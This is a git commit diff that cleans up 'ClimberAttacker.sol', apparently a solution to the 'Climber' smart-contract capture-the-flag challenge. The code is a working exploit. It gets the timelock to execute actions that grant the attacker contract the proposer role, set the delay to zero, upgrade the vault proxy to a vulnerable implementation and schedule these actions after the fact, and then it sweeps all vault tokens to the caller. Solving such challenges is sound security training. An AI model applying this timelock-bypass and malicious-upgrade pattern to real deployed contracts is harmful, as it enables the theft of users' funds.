cbde34b65700130bcebfac79ea9cd962ea01d922
conache <C.conache@gmail.com>
2022-09-18 00:18:31 +0300

    Cleanup climber solution

--- contracts/climber/ClimberAttacker.sol
+++ contracts/climber/ClimberAttacker.sol
@@ -22,16 +22,10 @@ contract ClimberAttacker {
         address _tokenAddress
     ) external {
         salt = "salt";
-        targets.push(address(climberTimelock));
-        targets.push(address(climberTimelock));
-        targets.push(address(_vaultProxy));
-        targets.push(address(this));
 
+        // grant proposer role to the attacker contract
+        targets.push(address(climberTimelock));
         values.push(0);
-        values.push(0);
-        values.push(0);
-        values.push(0);
-
         dataElements.push(
             abi.encodeWithSignature(
                 "grantRole(bytes32,address)",
@@ -39,15 +33,30 @@ contract ClimberAttacker {
                 address(this)
             )
         );
+
+        // set execution delay to 0
+        targets.push(address(climberTimelock));
+        values.push(0);
         dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
+
+        // upgrade vault to vulnerable version
+        targets.push(address(_vaultProxy));
+        values.push(0);
         dataElements.push(
             abi.encodeWithSignature(
                 "upgradeTo(address)",
                 address(_vulnerableVault)
             )
         );
+
+        // schedule above actions
+        targets.push(address(this));
+        values.push(0);
         dataElements.push(abi.encodeWithSignature("schedule()"));
+
         climberTimelock.execute(targets, values, dataElements, salt);
+
+        // get all founds from the vault address
         ClimberVaultVulnerable(_vaultProxy).sweepFunds(
             _tokenAddress,
             msg.sender
